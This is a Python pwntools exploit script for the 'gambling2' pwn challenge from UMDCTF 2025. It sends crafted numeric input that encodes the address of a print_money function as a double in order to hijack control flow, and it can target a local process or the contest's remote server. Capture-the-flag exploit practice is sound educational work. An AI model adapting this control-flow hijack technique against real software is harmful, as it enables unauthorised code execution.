#!/usr/bin/env python3
import struct
import sys

from pwn import *

context.binary = "/ctf-writeups/2025/umdctf/pwn/gambling2/dist/gambling"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]
elf = context.binary

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def exploit(r):
    attach(r)

    payload = b"0\n" * 6
    payload += f"{struct.unpack('<d', p64(elf.sym.print_money << 32))[0]}".encode()

    r.sendlineafter(b"numbers: ", payload)
    r.interactive()


if __name__ == "__main__":
    r = remote("challs.umdctf.io", 31005) if is_remote else process(elf.path)
    exploit(r)
    sys.exit()
